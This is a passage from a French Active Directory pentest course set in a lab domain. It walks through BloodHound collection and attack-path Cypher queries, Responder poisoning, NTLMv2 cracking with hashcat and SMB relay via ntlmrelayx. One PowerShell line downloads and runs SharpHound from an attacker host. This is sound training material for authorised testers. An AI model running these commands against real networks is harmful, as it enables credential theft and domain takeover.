#### Étape 5 : Dump complet avec ldapdomaindump

```bash
# ─── Dump complet pour analyse offline ───────────────────────────────────────
ldapdomaindump ldap://192.168.1.10 \
  -u "SDV-M2\\jdoe" \
  -p 'P@ssw0rd' \
  -o exports/ldapdomaindump/

# ─── Vérification des fichiers générés ───────────────────────────────────────
ls -la exports/ldapdomaindump/

# ─── Analyse rapide via JSON ─────────────────────────────────────────────────
grep -E '"adminCount":1|"servicePrincipalName"' exports/ldapdomaindump/domain_users.json

# ─── Analyse des groupes privilégiés ─────────────────────────────────────────
cat exports/ldapdomaindump/domain_groups.json | python3 -c "
import json, sys
data = json.load(sys.stdin)
for g in data:
    if g.get('adminCount') == 1 or 'Admin' in g.get('cn',''):
        print('[+] ' + g['cn'] + ' — ' + str(len(g.get('member',[]))) + ' membres')
"
```

#### Étape 6 : Synthèse des résultats

```bash
# ─── Générer un rapport textuel ───────────────────────────────────────────────
cat > exports/rapport-enumeration.md << 'RAPPORT'
# Rapport d'énumération AD — sdv-m2.lab

## Résumé
- Domaine : sdv-m2.lab
- DC : dc01.sdv-m2.lab (192.168.1.10)
- Date de l'audit : $(date +%Y-%m-%d)

## Statistiques
- Utilisateurs : ...
- Groupes : ...
- Ordinateurs : ...
- OU : ...

## Cibles identifiées
### Kerberoastable
- svc_sql (MSSQLSvc/sql01.sdv-m2.lab:1433)
- svc_http (HTTP/webapp.sdv-m2.lab)

### AS-REP Roastable
- (aucun)

### Privilégiés
- jsmith (Domain Admins)
- Administrator (Domain Admins)

## Recommandations
- Désactiver les comptes Kerberoastables inutiles
- Changer les mots de passe des comptes de service
RAPPORT
```

---

## 3. BloodHound

### 3.1 Présentation

**BloodHound** est l'outil le plus puissant pour l'analyse des relations de confiance et des chemins d'attaque dans Active Directory. Il utilise la théorie des graphes pour :
- Cartographier les relations entre utilisateurs, groupes, ordinateurs, sessions
- Identifier les chemins les plus courts vers les cibles à haute valeur (Domain Admins, Enterprise Admins)
- Détecter les ACLs dangereuses (GenericAll, WriteDacl, WriteOwner, etc.)
- Visualiser les opportunités de Kerberoasting, AS-REP Roasting, DCSync

**Architecture :**

```
┌──────────────┐     ┌──────────────────┐     ┌──────────────────────┐
│  Collecteur  │────►│   Neo4j Database │────►│   BloodHound GUI    │
│  SharpHound  │     │   (Graph DB)     │     │   (Electron App)    │
│  BH.py       │     │   localhost:7687  │     │   localhost:8080    │
└──────────────┘     └──────────────────┘     └──────────────────────┘
     │
     │ Sortie : JSON / ZIP
     ▼
fichiers .json
```

**Technique MITRE ATT&CK : T1087 — Account Discovery**, T1069 — Permission Groups Discovery

### 3.2 Installation de Neo4j

Neo4j est la base de données graphe utilisée par BloodHound.

```bash
# ─── Installation sur Kali/Debian ─────────────────────────────────────────────

# Méthode 1 : via le dépôt officiel Neo4j
wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -
echo 'deb https://debian.neo4j.com stable 4.4' | sudo tee /etc/apt/sources.list.d/neo4j.list
sudo apt update
sudo apt install -y neo4j

# Méthode 2 : via apt standard (version parfois plus ancienne)
sudo apt update && sudo apt install -y neo4j

# ─── Démarrer Neo4j ──────────────────────────────────────────────────────────
sudo systemctl start neo4j
sudo systemctl enable neo4j   # Démarrage automatique au boot

# ─── Vérifier le statut ──────────────────────────────────────────────────────
sudo systemctl status neo4j
# Sortie attendue :
# ● neo4j.service - Neo4j Graph Database
#    Loaded: loaded ...
#    Active: active (running) since ...

# ─── Ports utilisés par Neo4j ────────────────────────────────────────────────
ss -tlnp | grep -E '7474|7687'
# 7474 → Interface HTTP (Browser Neo4j)
# 7687 → Bolt (protocole binaire pour les clients)

# ─── Configuration du mot de passe Neo4j ──────────────────────────────────────
# Accéder au navigateur Neo4j : http://localhost:7474
# Identifiants par défaut :
#   Utilisateur : neo4j
#   Mot de passe : neo4j   (changé à la première connexion)

# Via ligne de commande (alternative) :
neo4j-admin set-initial-password bloodhound
```

**⚠️ Note importante :** Neo4j version 4.4.x est recommandée pour BloodHound.

```bash
# ─── Vérifier la version de Neo4j ─────────────────────────────────────────────
dpkg -l | grep neo4j

# ─── Arrêt/démarrage manuel ───────────────────────────────────────────────────
sudo neo4j stop
sudo neo4j start
sudo neo4j restart
```

### 3.3 Installation de BloodHound GUI

```bash
# ─── Téléchargement de la dernière release depuis GitHub ──────────────────────
# Rendez-vous sur : https://github.com/BloodHoundAD/BloodHound/releases
# Ou téléchargez directement :

wget https://github.com/BloodHoundAD/BloodHound/releases/download/v4.3.1/BloodHound-linux-x64.zip

# ─── Extraction ───────────────────────────────────────────────────────────────
unzip BloodHound-linux-x64.zip -d /opt/
sudo mv /opt/BloodHound-linux-x64 /opt/BloodHound

# ─── Vérification de l'extraction ─────────────────────────────────────────────
ls -la /opt/BloodHound/
# Sortie attendue :
# -rwxr-xr-x  BloodHound                  (binaire exécutable)
# drwxr-xr-x  resources/
# drwxr-xr-x  locales/

# ─── Lancement de BloodHound (après avoir démarré Neo4j) ──────────────────────
/opt/BloodHound/BloodHound &

# Vous pouvez aussi créer un alias dans ~/.bashrc :
echo "alias bloodhound='/opt/BloodHound/BloodHound &'" >> ~/.bashrc
source ~/.bashrc
```

#### Connexion à BloodHound

1. Lancer Neo4j : `sudo neo4j start`
2. Lancer BloodHound : `/opt/BloodHound/BloodHound`
3. Écran de login :
   - **Database URL** : `bolt://localhost:7687`
   - **Username** : `neo4j`
   - **Password** : `bloodhound` (ou celui défini)

> **⚠️ Attention :** Les identifiants Neo4j par défaut sont `neo4j:neo4j` — changez-les en production !

### 3.4 Collecte des données

Il existe deux collecteurs principaux pour BloodHound :

1. **SharpHound** (Windows) — C# .NET, collecte la plus complète
2. **BloodHound.py** (Linux) — Python, alternative légère

#### SharpHound (Windows)

```powershell
# ─── Téléchargement de SharpHound.ps1 (version PowerShell) ────────────────────
# Depuis une machine Windows du domaine (ou via un beacon C2)

# Option 1 : SharpHound.ps1 (PowerShell)
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Temp -ZipFileName ldap

# Option 2 : SharpHound.exe (binaire)
# Télécharger depuis : https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
SharpHound.exe -c All --zipfilename sdvm2

# Option 3 : Via upload C2
# shell SharpHound.exe -c All
```

**Méthodes de collecte :**

| Flag | Méthode | Description |
|------|---------|-------------|
| `-c All` | Toutes | Collecte complète (recommandé) |
| `-c Default` | Défaut | Groupes, utilisateurs, sessions |
| `-c DCOnly` | DC uniquement | Sans scanner les machines distantes |
| `-c Group` | Groupes | Membres de groupes seulement |
| `-c LocalAdmin` | Admins locaux | Utilisateurs avec droits admin |
| `-c RDP` | RDP | Utilisateurs avec accès RDP |
| `-c Session` | Sessions | Sessions actives |
| `-c Trusts` | Trusts | Relations de confiance |
| `-c ACL` | ACLs | Permissions DACL |
| `-c Container` | Conteneurs | OU et conteneurs |
| `-c DCOM` | DCOM | Utilisateurs avec accès DCOM |
| `-c PSRemote` | PSRemote | Utilisateurs avec accès WinRM |
| `-c LoggedOn` | LoggedOn | Sessions utilisateur |

```powershell
# ─── Exemple : collecte rapide (seulement DC) ────────────────────────────────
SharpHound.exe -c DCOnly --zipfilename rapid-dc

# ─── Exemple : collecte sans sessions (plus discret) ──────────────────────────
SharpHound.exe -c Group,LocalAdmin,ACL,Trusts --zipfilename no-sessions

# ─── Exemple : toutes les collectes ──────────────────────────────────────────
SharpHound.exe -c All --outputdirectory C:\Windows\Temp\ --zipfilename full-$(Get-Date -Format 'yyyyMMdd-HHmmss')
```

**Sortie :** un fichier ZIP contenant des fichiers JSON :

```
20250528-sdvm2.zip
├── 20250528143000_users.json
├── 20250528143000_groups.json
├── 20250528143000_computers.json
├── 20250528143000_sessions.json
├── 20250528143000_acl.json
├── 20250528143000_container.json
├── 20250528143000_dcom.json
├── 20250528143000_psremote.json
├── 20250528143000_trusts.json
└── META-INF/
    └── manifest.json
```

#### BloodHound.py (Linux)

```bash
# ─── Installation de BloodHound.py ────────────────────────────────────────────
pip install bloodhound

# ─── Vérification ─────────────────────────────────────────────────────────────
bloodhound-python --help
```

```bash
# ─── Collecte avec BloodHound.py ──────────────────────────────────────────────
# Paramètres :
#   -d : domaine
#   -u : nom d'utilisateur
#   -p : mot de passe
#   -gc : Global Catalog (pour la collecte complète)
#   -c : méthodes de collecte (ALL, DCOnly, Group, Session, etc.)
#   --zip : compresser la sortie en ZIP

# ─── Collecte complète (nécessite un compte domaine) ──────────────────────────
mkdir -p exports/bloodhound

bloodhound-python -d sdv-m2.lab \
  -u jdoe \
  -p 'P@ssw0rd' \
  -dc dc01.sdv-m2.lab \
  -gc dc01.sdv-m2.lab \
  -c ALL \
  --zip \
  -ns 192.168.1.10 \
  -o exports/bloodhound/

# Explication des paramètres :
#   -d sdv-m2.lab          : domaine cible
#   -u jdoe                : utilisateur pour la collecte
#   -p 'P@ssw0rd'          : mot de passe
#   -dc dc01.sdv-m2.lab    : contrôleur de domaine
#   -gc dc01.sdv-m2.lab    : serveur de catalogue global
#   -c ALL                 : toutes les collectes disponibles
#   --zip                  : compresser les JSON en ZIP
#   -ns 192.168.1.10       : serveur DNS
#   -o exports/bloodhound/ : dossier de sortie

# ─── Sortie attendue ──────────────────────────────────────────────────────────
[+] Connecting to LDAP server: dc01.sdv-m2.lab
[+] Found 1 domains
[+] Found 1 domains in the forest
[+] Found 2 computers
[+] Found 15 users
[+] Found 12 groups
[+] Found 0 trusts
[+] Found 0 sessions
[+] Done! Output written to exports/bloodhound/
[+] Zipping output...
[+] Archive: exports/bloodhound/20250528143000_bloodhound.zip

# ─── Avec authentification par hash NTLM ─────────────────────────────────────
bloodhound-python -d sdv-m2.lab \
  -u jdoe \
  --hashes 'LMHASH:NTHASH' \
  -dc dc01.sdv-m2.lab \
  -c ALL \
  -ns 192.168.1.10 \
  -o exports/bloodhound/

# ─── Avec authentification Kerberos (ccache) ──────────────────────────────────
export KRB5CCNAME=/path/to/ticket.ccache
bloodhound-python -d sdv-m2.lab \
  -u jdoe \
  --use-kcache \
  -dc dc01.sdv-m2.lab \
  -c ALL \
  -ns 192.168.1.10 \
  -o exports/bloodhound/
```

### 3.5 Importation dans BloodHound

```bash
# ─── Vérifier que Neo4j tourne ────────────────────────────────────────────────
sudo neo4j status
# Si Neo4j n'est pas lancé :
sudo neo4j start

# ─── Lancer BloodHound ────────────────────────────────────────────────────────
/opt/BloodHound/BloodHound &
```

Une fois l'interface BloodHound ouverte :

1. Cliquer sur **"Upload Data"** (icône d'upload en haut à droite)
2. Sélectionner le fichier ZIP (ou les fichiers JSON individuels)
3. Attendre l'importation (barre de progression en haut)

**Vérification dans Neo4j (optionnel) :**

```bash
# ─── Vérifier que les données sont dans Neo4j ─────────────────────────────────
cypher-shell -u neo4j -p bloodhound

# Compter les noeuds
MATCH (n) RETURN count(n) AS node_count;
# Compter les relations
MATCH ()-[r]->() RETURN count(r) AS rel_count;
# Lister les types de noeuds
MATCH (n) RETURN labels(n) AS node_type, count(n) AS count ORDER BY count DESC;

# Sortie attendue :
# ╒════════════════╤═══════╕
# │node_type       │count  │
# ╞════════════════╪═══════╡
# │["User"]        │15     │
# │["Group"]       │12     │
# │["Computer"]    │2      │
# │["Domain"]      │1      │
# └────────────────┴───────┘

:exit
```

### 3.6 Requêtes BloodHound — Fondamentales

BloodHound utilise le langage **Cypher** pour interroger le graphe. Voici les requêtes pré-intégrées (via l'onglet "Analysis") et leurs équivalents Cypher.

#### Onglet Analysis → "Find all Domain Admins"

```cypher
MATCH (g:Group {name: 'DOMAIN ADMINS@SDV-M2.LAB'})
MATCH (u:User)
WHERE (u)-[:MemberOf*1..]->(g)
RETURN u.name, u.displayname
ORDER BY u.name
```

**Résultat attendu :**
```
╒═══════════════════════════╤══════════════════╕
│u.name                     │u.displayname     │
╞═══════════════════════════╪══════════════════╡
│"ADMINISTRATOR@SDV-M2.LAB" │"Administrateur"  │
│"JSMITH@SDV-M2.LAB"        │"John Smith"      │
└───────────────────────────┴──────────────────┘
```

#### Onglet Analysis → "Shortest Paths to High Value Targets"

```cypher
MATCH (n {highvalue:true})
MATCH (m)
WHERE m <> n AND NOT m.highvalue
MATCH p = shortestPath((m)-[*1..]->(n))
RETURN p
```

#### Onglet Analysis → "Find all Kerberoastable Users"

```cypher
MATCH (u:User {hasspn:true})
RETURN u.name, u.serviceprincipalnames
ORDER BY u.name
```

**Résultat attendu :**
```
╒════════════════════════════════╤══════════════════════════════╕
│u.name                          │u.serviceprincipalnames       │
╞════════════════════════════════╪══════════════════════════════╡
│"SVC_SQL@SDV-M2.LAB"           │["MSSQLSvc/sql01:1433"]      │
│"SVC_HTTP@SDV-M2.LAB"          │["HTTP/webapp.sdv-m2.lab"]   │
└────────────────────────────────┴──────────────────────────────┘
```

#### Onglet Analysis → "Find AS-REP Roastable Users (DontReqPreAuth)"

```cypher
MATCH (u:User {dontreqpreauth:true})
RETURN u.name, u.displayname
ORDER BY u.name
```

#### Onglet Analysis → "Users with most privileges"

```cypher
MATCH (u:User)
OPTIONAL MATCH (u)-[:MemberOf*1..]->(g:Group)
WITH u, COUNT(DISTINCT g) AS groupCount
OPTIONAL MATCH (u)-[:AdminTo]->(c:Computer)
WITH u, groupCount, COUNT(DISTINCT c) AS adminCount
RETURN u.name, groupCount, adminCount
ORDER BY groupCount DESC
```

### 3.7 Requêtes avancées — Custom Cypher

#### DCSync Rights

```cypher
// ─── DCSync Rights ──────────────────────────────────────────────────────────
// Recherche les entités avec les droits GetChanges/GetChangesAll

MATCH (n {domain: 'SDV-M2.LAB'})
MATCH (dc:Computer {domain: 'SDV-M2.LAB'})
WHERE dc.operatingsystem =~ '(?i).*server.*'
MATCH p = (n)-[r]->(dc)
WHERE r.IsACL = true AND (
  r.rights CONTAINS 'GetChanges' OR
  r.rights CONTAINS 'DS-Replication-Get-Changes'
)
RETURN n.name AS Who, type(r) AS Permission, dc.name AS Target
ORDER BY n.name
```

#### Users avec GenericAll sur des groupes privilégiés

```cypher
// ─── GenericAll sur groupes privilégiés ─────────────────────────────────────
// Permet d'ajouter un utilisateur à un groupe (abus : ajouter son compte aux admins)

MATCH (u:User)
MATCH (g:Group)
WHERE g.highvalue = true
MATCH p = (u)-[r:GenericAll]->(g)
RETURN u.name AS User, g.name AS TargetGroup, r.rights AS Rights
ORDER BY g.name
```

#### WriteDacl sur un objet

```cypher
// ─── WriteDacl ──────────────────────────────────────────────────────────────
// Permet de modifier les permissions d'un objet (escalade de privilèges)

MATCH (n {domain: 'SDV-M2.LAB'})
MATCH (m {domain: 'SDV-M2.LAB'})
MATCH p = (n)-[r:WriteDacl]->(m)
RETURN n.name AS WhoCanWrite, m.name AS Target, r.rights AS Rights
```

#### WriteOwner sur un objet

```cypher
// ─── WriteOwner ─────────────────────────────────────────────────────────────
// Permet de prendre possession d'un objet

MATCH (n {domain: 'SDV-M2.LAB'})
MATCH (m {domain: 'SDV-M2.LAB'})
MATCH p = (n)-[r:WriteOwner]->(m)
RETURN n.name AS WhoCanWriteOwner, m.name AS Target, r.rights AS Rights
```

#### Sessions actives

```cypher
// ─── Sessions actives sur les serveurs ──────────────────────────────────────
// Utile pour le Pass-the-Hash / Token impersonation

MATCH (c:Computer)-[:HasSession]->(u:User)
RETURN c.name AS Computer, u.name AS User
ORDER BY c.name
```

#### Chemins vers le domaine

```cypher
// ─── Tous les chemins avec 3+ trous ─────────────────────────────────────────
// Révèle les chemins d'attaque les plus longs (détection des ACL complexes)

MATCH (n:User)
MATCH (d:Domain {name: 'SDV-M2.LAB'})
MATCH p = shortestPath((n)-[*1..]->(d))
WHERE length(p) > 2
RETURN n.name AS StartingUser, length(p) AS PathLength, nodes(p) AS Path
ORDER BY PathLength DESC
```

#### Délégation Kerberos non contrainte

```cypher
// ─── Unconstrained Delegation ───────────────────────────────────────────────
// Permet de déléguer l'identité à n'importe quel service (très dangereux)

MATCH (c:Computer {unconstraineddelegation:true})
RETURN c.name AS ComputerWithDelegation, c.operatingsystem AS OS
```

#### Délégation Kerberos contrainte

```cypher
// ─── Constrained Delegation ─────────────────────────────────────────────────
MATCH (c:Computer)
WHERE c.allowedtodelegate IS NOT NULL
RETURN c.name AS Computer, c.allowedtodelegate AS AllowedDelegation
```

#### GPO applicables

```cypher
// ─── GPOs liés à des OU spécifiques ─────────────────────────────────────────
MATCH (gpo:GPO)-[:GpLink]->(ou:OU)
RETURN ou.name AS OU, gpo.name AS GPO, gpo.gpcfilesyspath AS Path
ORDER BY ou.name
```

#### Metsys' Ultimate Cypher Queries

```cypher
// ─── Trouver les principaux qui peuvent écrire des GPO ─────────────────────
MATCH p = (n)-[:GenericAll|WriteOwner|WriteDacl|AllExtendedRights]->(g:GPO)
RETURN n.name AS Principal, g.name AS GPO, type(r) AS Permission

// ─── Trouver les utilisateurs qui peuvent RDP sur des machines ─────────────
MATCH (u:User)-[:CanRDP]->(c:Computer)
RETURN u.name AS User, c.name AS Computer

// ─── Trouver les groupes Enterprise Admins (forêt) ────────────────────────
MATCH (g:Group {name: 'ENTERPRISE ADMINS@SDV-M2.LAB'})
MATCH (u:User)-[:MemberOf]->(g)
RETURN u.name AS EnterpriseAdmin

// ─── Lister les relations de confiance identifiées ──────────────────────────
MATCH (n:Domain)-[r:TrustedBy|HasTrust]->(m:Domain)
RETURN n.name AS Source, type(r) AS TrustType, m.name AS Target
```

### 3.8 Analyse via BloodHound — Workflow

#### Étape 1 : Marquer les High Value Targets

BloodHound marque automatiquement :
- **Domain Admins**
- **Enterprise Admins**
- **Domain Controllers**
- **Administrator**

Marquer manuellement : clic droit → **"Mark as High Value"**

#### Étape 2 : Requêtes "Outbound Control Rights"

BloodHound → Analysis → **"Outbound Control Rights"**
- Montre quels objets ont des droits de contrôle sur d'autres objets
- Identifie les relations ACL abusables

#### Étape 3 : Requêtes "Shortest Paths"

BloodHound → Analysis → **"Shortest Paths to High Value Targets"**
- Carte la route la plus rapide pour chaque noeud utilisateur vers un noeud High Value
- Permet de prioriser les attaques

#### Étape 4 : Export du graphe

```bash
# ─── Export de l'analyse BloodHound en image ─────────────────────────────────
# L'interface BloodHound vous permet de :
# 1. Zoomer sur le chemin d'attaque souhaité
# 2. Appuyer sur Ctrl+S (ou Fichier → Export Graph)
# 3. Choisir le format : PNG, SVG, GRAPHML, CSV

# Pour un export programmatique, utilisez Cypher vers Neo4j :
cypher-shell -u neo4j -p bloodhound \
  "MATCH (n) RETURN n.name, labels(n), n.highvalue" \
  > exports/bloodhound/nodes.csv

cypher-shell -u neo4j -p bloodhound \
  "MATCH ()-[r]->() RETURN type(r), startNode(r).name, endNode(r).name" \
  > exports/bloodhound/edges.csv
```

### 3.9 TP Guidé — BloodHound complet

#### Contexte

Vous avez compromis un poste utilisateur sur le domaine `sdv-m2.lab`. Depuis ce poste, vous devez :
1. Collecter les données AD avec SharpHound
2. Importer dans BloodHound
3. Analyser les chemins d'attaque
4. Identifier les comptes Kerberoastables

#### Étape 1 : Collecte

```bash
# ─── Depuis votre Kali (si accès réseau au DC) ────────────────────────────────
mkdir -p exports/bloodhound-lab

bloodhound-python -d sdv-m2.lab \
  -u jdoe -p 'P@ssw0rd' \
  -dc dc01.sdv-m2.lab \
  -gc dc01.sdv-m2.lab \
  -c ALL \
  -ns 192.168.1.10 \
  --zip \
  -o exports/bloodhound-lab/

ls -la exports/bloodhound-lab/*.zip
```

#### Étape 2 : Configuration de Neo4j

```bash
# ─── Arrêt de Neo4j s'il tournait ────────────────────────────────────────────
sudo neo4j stop

# ─── Configuration mémoire (optionnel pour grosses collectes) ─────────────────
sudo sed -i 's/#dbms.memory.heap.initial_size=512m/dbms.memory.heap.initial_size=2048m/' /etc/neo4j/neo4j.conf
sudo sed -i 's/#dbms.memory.heap.max_size=1G/dbms.memory.heap.max_size=4G/' /etc/neo4j/neo4j.conf
sudo sed -i 's/#dbms.memory.pagecache.size=10m/dbms.memory.pagecache.size=2g/' /etc/neo4j/neo4j.conf

sudo neo4j start
sleep 5
sudo neo4j status
```

#### Étape 3 : Import et analyse

```bash
# ─── Lancement de BloodHound ─────────────────────────────────────────────────
/opt/BloodHound/BloodHound &

# 1. Connexion à Neo4j (bolt://localhost:7687 - neo4j:bloodhound)
# 2. Upload du fichier ZIP collecté
# 3. Naviguer vers l'onglet "Analysis"
```

#### Étape 4 : Requêtes à effectuer

```bash
# ─── Dans l'onglet Analysis, exécutez dans l'ordre : ──────────────────────────
#
# 1. "Find all Domain Admins"
#    → Identifier qui peut controller le domaine
#
# 2. "Shortest Paths to High Value Targets"
#    → Voir le chemin de votre utilisateur actuel vers les DA
#
# 3. "Find all Kerberoastable Users"
#    → Identifier les comptes de service vulnérables
#
# 4. "Find Computers where Domain Users are Local Admin"
#    → Voir les serveurs où Domain Users a des droits
#
# 5. "Find all AS-REP Roastable Users"
#    → Comptes sans pré-authentification
#
# 6. Requêtes custom :
#    - DCSync rights
#    - GenericAll / WriteDacl sur groupes
#    - Délégation non contrainte
```

#### Étape 5 : Documenter les findings

```bash
# ─── Génération d'un rapport BloodHound ──────────────────────────────────────
cat > exports/bloodhound-report.md << 'EOF'
# BloodHound Analysis Report — sdv-m2.lab

## 1. High Value Targets
### Domain Admins
- ADMINISTRATOR@SDV-M2.LAB
- JSMITH@SDV-M2.LAB

### Enterprise Admins
- ADMINISTRATOR@SDV-M2.LAB

## 2. Kerberoastable Users
| User | SPN |
|------|-----|
| svc_sql | MSSQLSvc/sql01:1433 |
| svc_http | HTTP/webapp.sdv-m2.lab |

## 3. AS-REP Roastable
| User | Reason |
|------|--------|
| (none found) | Bien configuré |

## 4. Critical ACLs
| Source | Permission | Target |
|--------|------------|--------|
| jdoe | GenericAll | svc_sql |
| IT_Group | WriteDacl | Domain Admins |

## 5. Unconstrained Delegation
| Computer | OS |
|----------|----|
| dc01.sdv-m2.lab | Windows Server 2022 |
EOF
```

---

## 4. Responder — Empoisonnement LLMNR/NBT-NS

### 4.1 Présentation

**Responder** est un outil mythique de la suite Python qui permet d'**empoisonner** les protocoles de résolution de noms Windows (LLMNR, NBT-NS, MDNS) pour capturer des hashs NTLMv2.

**Principe :**
1. Un client Windows tente d'accéder à une ressource (ex: `\\serveur\partage`)
2. Si le nom DNS n'est pas résolu, Windows envoie une requête **LLMNR** ou **NBT-NS** sur le réseau local
3. Responder répond en se faisant passer pour le serveur demandé
4. Le client envoie son hash NTLMv2 pour s'authentifier
5. Responder capture le hash pour craquage offline (hashcat) ou relay (SMB Relay)

**Technique MITRE ATT&CK : T1557 — Man-in-the-Middle / LLMNR/NBT-NS Poisoning**

### 4.2 Installation

```bash
# ─── Installation via git (recommandé, version la plus récente) ───────────────
git clone https://github.com/lgandx/Responder /opt/Responder

# ─── Vérification ─────────────────────────────────────────────────────────────
ls /opt/Responder/
# Sortie attendue :
# Responder.py       ← Script principal
# Responder.conf     ← Fichier de configuration
# tools/             ← Utilitaires additionnels
#   MultiRelay.py    ← SMB Relay tool
#   RunFinger.py     ← Fingerprinting hosts
# settings.py        ← Configuration Python

# ─── Installation des dépendances ─────────────────────────────────────────────
pip install -r /opt/Responder/requirements.txt

# ─── Installation via apt (Kali inclut Responder par défaut) ──────────────────
sudo apt update && sudo apt install -y responder

# ─── Vérification de l'installation ───────────────────────────────────────────
responder --version
```

### 4.3 Configuration (Responder.conf)

Le fichier `Responder.conf` permet de configurer finement le comportement de Responder.

```bash
# ─── Ouvrir le fichier de configuration ───────────────────────────────────────
nano /opt/Responder/Responder.conf
```

**Structure du fichier :**

```ini
[Responder Core]
; ─── Interface de réponse ───
; Serveurs auxquels Responder va répondre
SQL = On
FTP = On
SMTP = On
POP3 = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On
SMB = On
Kerberos = On
MSSQL = On
; ⚠️ Si vous relayez SMB (MultiRelay), désactivez SMB = On
; et utilisez l'option `-r` ou le mode relay

; ─── Options générales ───
Challenge = Random        ; Défi NTLM (Random = aléatoire, ou fixe)
                           ; Si fixe = permet le rainbow table
                           ; Valeur hexadécimale : 1122334455667788

; ─── Mode serveur HTTP/HTTPS ───
WPAD = On                 ; Serveur WPAD (Web Proxy Auto-Discovery)
                           ; Redirige le trafic navigateur vers Responder
WPADPort = 3141           ; Port du serveur WPAD

; ─── Mode serveur SMB ───
SMBPort = 445             ; Port SMB

; ─── Options de sortie ───
LogDir = /usr/share/responder/logs/   ; Dossier des logs
```

```bash
# ─── Configuration pratique pour un engagement ───────────────────────────────
# Désactiver SMB si on veut uniquement capturer sans relayer
# Car SMB = On peut causer des refus de connexion côté client

# Activer WPAD si l'objectif est aussi la capture de proxy
```

### 4.4 Utilisation de base

```bash
# ─── Syntaxe ──────────────────────────────────────────────────────────────────
python3 /opt/Responder/Responder.py -h

# Options principales :
#   -I <interface>    Interface réseau (eth0, wlan0, tun0, etc.)
#   -i <IP>          Adresse IP de l'interface (par défaut : auto)
#   -e <IP>          Adresse IP du serveur WPAD (par défaut : -i)
#   -r <IP>          Activer le relay SMB après la capture
#   -d               Activer le mode DHCP (empoisonnement DHCP)
#   -w               Activer le serveur WPAD
#   -f               Fingerprint (RunFinger) : analyse OS des hôtes
#   -v               Mode verbose (affiche les requêtes détaillées)
#   -A               Mode analyse uniquement (sans répondre)
#   -F               Forcer l'authentification NTLM même si l'hôte
#                     ne supporte pas
```

```bash
# ─── Mode standard : capture LLMNR + NBT-NS + MDNS ────────────────────────────
sudo python3 /opt/Responder/Responder.py -I eth0 -w -v

# ─── Mode avec WPAD (détection proxy automatique) ─────────────────────────────
sudo python3 /opt/Responder/Responder.py -I eth0 -w

# ─── Mode seulement analyse (écoute sans répondre) ────────────────────────────
sudo python3 /opt/Responder/Responder.py -I eth0 -A

# ─── Mode avec DHCP (empoisonnement DHCP) ─────────────────────────────────────
sudo python3 /opt/Responder/Responder.py -I eth0 -d -w
```

### 4.5 Sortie typique

Lorsqu'une requête est interceptée, Responder affiche :

```
[+] Listening for events... [LLMNR] [NBT-NS] [MDNS] [HTTP] [SMB]

[*] [LLMNR] Poisoned answer sent to 192.168.1.20 for name SERVEUR-PARTAGE
[*] [MDNS] Poisoned answer sent to 192.168.1.20 for name serveur-partage.local
[*] [LLMNR] Poisoned answer sent to 192.168.1.20 for name wpad

[HTTP] NTLMv2 Client   : 192.168.1.20
[HTTP] NTLMv2 Username : SDV-M2\jdoe
[HTTP] NTLMv2 Hash     : jdoe::SDV-M2:1122334455667788:2C9F3B8F0F0B1A...
```

Si un hash est capturé, Responder écrit dans un fichier de log :

```
[*] [HTTP] NTLMv2 hash captured from 192.168.1.20
[*] Sending NTLMv2 hash to logs/SMB-NTLMv2-192.168.1.20.txt
```

**Format du hash NTLMv2 :**

```
jdoe::SDV-M2:1122334455667788:2C9F3B8F0F0B1A2B3C4D5E6F7A8B9C0D:0101000000000000C0653150DEAAEFBBE47
```

**Structure :**
```
USERNAME::DOMAIN:CHALLENGE:NTProofStr:HMAC-SHA256(blob)+blob
│         │       │         │          │
│         │       │         │          └── Proof string + timestamp + nonce
│         │       │         └── NT proof (réponse HMAC)
│         │       └── Challenge (8 bytes hex)
│         └── Domain NetBIOS
└── Username
```

### 4.6 Craquage des hashs avec Hashcat

```bash
# ─── Format de hash NTLMv2 pour Hashcat ──────────────────────────────────────
# Mode hashcat pour NTLMv2 = 5600

# ─── Sauvegarder le hash dans un fichier ─────────────────────────────────────
echo 'jdoe::SDV-M2:1122334455667788:2C9F3B8F0F0B1A2B3C4D5E6F7A8B9C0D:0101000000000000C0653150DEAAEFBBE47' > hash.txt

# ─── Craquage avec Hashcat ───────────────────────────────────────────────────
# Avec wordlist rockyou :
hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force

# Avec règles (OneRuleToRuleThemAll) :
hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule --force

# ─── Craquage par brute force (8 caractères minuscules) ──────────────────────
hashcat -m 5600 -a 3 hash.txt '?l?l?l?l?l?l?l?l' --force

# ─── Affichage des mots de passe craqués ─────────────────────────────────────
hashcat -m 5600 --show hash.txt

# Sortie attendue :
# jdoe::SDV-M2:1122334455667788:...:P@ssw0rd
```

### 4.7 SMB Relay avec Responder

Le relais SMB permet de ne pas craquer le hash, mais de l'utiliser directement pour s'authentifier sur d'autres serveurs.

**Principe :**
1. Responder capture le hash NTLMv2
2. Au lieu de stocker le hash, il le relaie (rejoue) immédiatement vers une cible
3. Si la cible accepte l'authentification, l'attaquant obtient un accès

**Prérequis :**
- Désactiver `SMB = On` dans `Responder.conf`
- Identifier une cible avec SMB signing désactivé
- Disposer des droits de l'utilisateur dont le hash est relayé

```bash
# ─── Étape 1 : Désactiver SMB dans Responder.conf ────────────────────────────
sed -i 's/SMB = On/SMB = Off/' /opt/Responder/Responder.conf
grep "^SMB" /opt/Responder/Responder.conf
# Doit afficher : SMB = Off

# ─── Étape 2 : Détecter les cibles avec SMB signing désactivé ────────────────
crackmapexec smb 192.168.1.0/24 --gen-relay-list exports/smb-relay-targets.txt

# ─── Étape 3 : Lancer ntlmrelayx (impacket) en écoute SMB ────────────────────
impacket-ntlmrelayx -tf exports/smb-relay-targets.txt \
  -smb2support \
  -i \
  -socks

# Options :
#   -tf <file>           : fichier listant les cibles potentielles
#   -smb2support         : support du protocole SMB2
#   -i                   : mode interactif (shell)
#   -socks               : tunnel SOCKS persistant
#   -c <command>         : exécuter une commande à distance
#   -e <binary>          : uploader et exécuter un binaire

# ─── Étape 4 : Lancer Responder avec relay ────────────────────────────────────
sudo python3 /opt/Responder/Responder.py -I eth0 -v
```

**Utilisation de ntlmrelayx avec socks :**

```bash
